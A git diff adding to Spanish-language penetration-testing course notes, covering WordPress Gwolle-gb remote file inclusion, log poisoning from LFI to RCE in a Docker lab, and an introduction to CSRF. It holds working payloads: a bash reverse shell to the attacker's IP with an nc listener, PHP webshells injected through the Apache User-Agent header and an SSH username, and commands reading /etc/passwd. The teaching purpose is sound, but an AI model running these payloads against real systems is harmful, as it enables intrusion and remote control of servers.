@@ -2102,6 +2102,8 @@ En resumen, BurpSuite es una herramienta imprescindible para cualquier profesion
 
 ### SQL Injection (SQLI)
 
+Vulnerabilidad Favorita de S4vitar.
+
 SQL Injection es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que **no validan adecuadamente** la entrada del usuario en la consulta SQL que se envía a la base de datos. Los atacantes pueden utilizar está técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos.
 
 Las inyecciones SQL se producen cuando los atacantes insertan código SQL malicioso en los campos de entrada de una aplicación web. Si la aplicación no valida adecuadamente la entrada del usuario, la consulta SQL maliciosa se ejecutará en la base de datos, lo que permitirá al atacante obtener información confidencial o incluso controlar la base de datos.
@@ -3538,7 +3540,102 @@ nvim wp-load.php
 ?>
 
 # En el navegador
-http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://miIP/
+http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://miIP/&cmd=whoami
+
+http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://miIP/&cmd=id
+
+#ATACANTE
+nc -nlvp 443
+
+http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://miIP/&cmd=bash -c "bash -i >%26 /dev/tcp/miIp/443 0>%261"
+
+```
+
+### Log Poisoning (LFI -> RCE)
+
+El **Log Poisoning** es una técnica de ataque en la que un atacante **manipula** los **archivos de registro** (**logs**) de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad **LFI** para lograr una **ejecución remota de comandos** en el servidor.
+
+Como ejemplos para esta clase, trataremos de envenenar los recursos '**auth.log** de **SSH** y '**access.log**' de **Apache**, comenzando mediante la explotación de una vulnerabilidad LFI primeramente para acceder a estos archivos de registro. Una vez hayamos logrado acceder a estos archivos, veremos cómo manipularlos para incluir código malicioso.
+
+En el caso de los logs de SSH, el atacante puede inyectar código de PHP en el campo de **usuario** durante el proceso de autenticación. Esto permite que el código se registre en el log '**auth.log**' de SSH y sea interpretado en el momento en el que el archivo de registro sea leído. De esta manera, el atacante puede lograr una ejecución remota de comandos en el servidor.
+
+En el caso del archivo '**access.log**' de Apache, el atacante puede inyectar código PHP en el campo **User-Agent** de una solicitud HTTP. Este código malicioso se registra en el archivo de registro 'access.log' de Apache y se ejecuta cuando el archivo de registro es leído. De esta manera, el atacante también puede lograr una ejecución remota de comandos en el servidor.
+
+Cabe destacar que en algunos sistemas, el archivo '**auth.log**' no es utilizado para registrar los eventos de autenticación de SSH. En su lugar, los eventos de autenticación pueden ser registrados en archivos de registro con diferentes nombres, como '**btmp**'.
+
+Por ejemplo, en sistemas basados en Debian y Ubuntu, los eventos de autenticación de SSH se registran en el archivo 'auth.log'. Sin embargo, en sistemas basados en Red Hat y CentOs, los eventos de autenticación de SSH se registran en el archivo 'btmp'. Aunque a veces pueden haber excepciones.
+
+Para prevenir el Log Poisoning, es importante que los desarrolladores limiten el acceso a los archivos de registro y aseguren que estos archivos se almacenen en un lugar seguro. Además, es importante que se valide adecuadamente la entrada del usuario y se filtre cualquier intento de entrada maliciosa antes de registrarla en los archivos de registro.
+
+```bash
+docker ps
+docker pull ubuntu:latest
+docker images
+docker run -dit -p 80:80 -p 22:22 --name logPoisoning ubuntu
+docker ps
+docker exec -it logPoisoning bash
+apt update
+apt install apache2 ssh nano php -y
+service apache2 start
+service ssh start
+cd /var/www/html
+rm index.html
+
+nano index.php
+<?php
+    include($_GET['filename']);
+?>
+
+# En el navegador
+localhost/index.php?filename=/etc/passwd # Nos muestra lo solicitado
+
+# En el contenedor
+cd /var/log/apache2
+cat access.log # Vemos lo que solicitamos por el navegador
+cd ..
+ls -l
+chown www-data:www-data -R apache2/
+
+# En el navegador
+localhost/index.php?filename=/var/log/apache2/access.log # Nos muestra lo solicitado
+
+
+curl -s -X GET "http://localhost/probando" -H "User-Agent: PROBANDO"
+# En el navegador
+localhost/index.php?filename=/var/log/apache2/access.log # Nos muestra lo solicitado
+
+
+
+curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system('whoami'); ?>"
+# En el navegador
+localhost/index.php?filename=/var/log/apache2/access.log # Nos muestra el usuario que solicitamos con el whoami
+
+
+
+
+
+curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php phpinfo(); ?>"
+# En el navegador
+localhost/index.php?filename=/var/log/apache2/access.log # Nos muestra el usuario que solicitamos con el whoami
+
+# Algunas funciones de php nos pueden llegar a dejar ejecutar comandos, disable_functions, shell_exec, path_trouhg, exec
+# Si disable_funcionts no tiene valor, puedes usar la funcion que te de la gana
+
+
+
+cd /var/log/apache2
+nano access.log  # Borramos la consulta de php info ctrl + k y los user agents
+
+
+
+
+curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
+# En el navegador
+localhost/index.php?filename=/var/log/apache2/access.log # No muestra nada
+
+# Si todo bien
+localhost/index.php?filename=/var/log/apache2/access.log&cmd=id # Nos debe mostrar el id
+localhost/index.php?filename=/var/log/apache2/access.log&cmd=ls -l
 
 
 
@@ -3546,13 +3643,56 @@ http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxrespons
 
 
 
+# En el contenedor
+cd /var/log
+cat btmp
 
+# En la maquina atacante
+ssh prueba@ipDelContenedor
+# Damos cualquier contraseña
 
+# En el contenedor
+cat btmp ; echo # Veremos el intento de inicio de sesion
 
+ssh '<?php system($_GET["cmd"]); ?>'@ipDelContenedor
+# Damos cualquier contraseña
 
+# En el contenedor
+cat btmp ; echo # 
+chmod +r btmp
 
+# En el navegador
+localhost/index.php?filename=/var/log/btmp&cmd=cat /etc/passwd
 
+localhost/index.php?filename=/var/log/btmp&cmd=ps -faux
 
+# Existen muchas variantes de log poisoning, smtp
+# Recomienda probar a enumerar logs
 
+```
+
+### Cross-Site Request Forgery (CSRF)
+
+Vulnerabilidad Favorita de S4vitar.
+
+**Aviso (Actualización 11/05/2023)**: Si a lahora de hacer el '**docker-compose up -d**', salta un error de tipo: "**networks.net-10.9.0.0 value Aditional properties are not allowes ('name' was unexpected)**", lo que tienes que hacer es en el archivo '**docker-compose.yml**', borrar la línea número 41, la que pone "**name: net-10.9.0.0**".
+
+Con hacer esto, ya podremos desplegar el laboratorio sin ningun problema.
+
+El **Cross-Site Request Forgery** (**CSRF**) es una vulnerabilidad de seguridad en la que un atacante **engaña** a un usuario legítimo para que realice una acción no deseada en un sitio web sin su conocimiento o consentimiento.
+
+En un ataque CSRF, el atacante engaña a la víctima para que haga clic en un enlace malicioso o visite una página web maliciosa. Esta página maliciosa puede contener una solicitud HTTP que realiza una acción no deseada en el sitio web de la víctima.
+
+Por ejemplo, imagina que un usuario ha iniciado sesión en su cuenta bancaria en línea y luego visita una página web maliciosa. La página maliciosa contiene un formulario que envía una solicitud HTTP al sitio web del banco para transferir fondos de la cuenta bancaria del usuario a la cuenta del atacante. Si el usuario hace clic en el botón de envío sin saber que está realizando una transferencia, el ataque CSRF habrá sido exitoso.
+
+El ataque CSRF puede ser utilizado para realizar una amplia variedad de acciones no deseadas, incluyendo la transferencia de fondos, la modificación de la información de la cuenta, la eliminación de datos y muchos más.
+
+Para prevenir los ataques CSRF, los desarrolladores de aplicaciones web deben implementar medidas de seguridad adecuadas, como la inclusión de tokens CSRF en los formularios y solicitudes HTTP. Estos tokens CSRF permiten que la aplicación web verifique que la solicitud proviene de un usuario legítimo y no de un atacante malintencionado (aunque cuidadín que también se pueden hacer cositas en esto).
+
+Compartimos a continuación el enlace comprimido ZIP que utilizamos en esta clase para desplegar el laboratorio donde practicamos esta vulnerabilidad.
+
+[Lab Setup](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)
+
+```bash
 
 ```
